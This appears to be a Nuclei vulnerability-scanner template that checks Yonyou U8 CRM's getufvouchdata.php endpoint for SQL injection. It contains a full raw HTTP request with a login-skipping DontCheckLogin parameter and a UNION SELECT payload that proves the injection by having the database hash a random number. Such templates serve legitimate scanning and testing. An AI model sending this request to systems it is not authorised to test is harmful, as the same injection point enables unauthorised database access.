id: poc-yaml-yongyon-u8-crm-getufvouchdata-php-sqli
info:
  name: 用友U8 CRM getufvouchdata.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL injection vulnerability in 用友U8 CRM's getufvouchdata.php endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /ajax/getufvouchdata.php?DontCheckLogin=1&Action=getRelations HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=bgsesstimeout-;

        pID=1%27%20UNION%20ALL%20SELECT%20sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--%20uSHu&cID=1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"items\":"
        part: body
      - type: word
        words:
          - "0x{{t2}}"
        part: body
      - type: word
        words:
          - "<"
        negative: true
        part: body
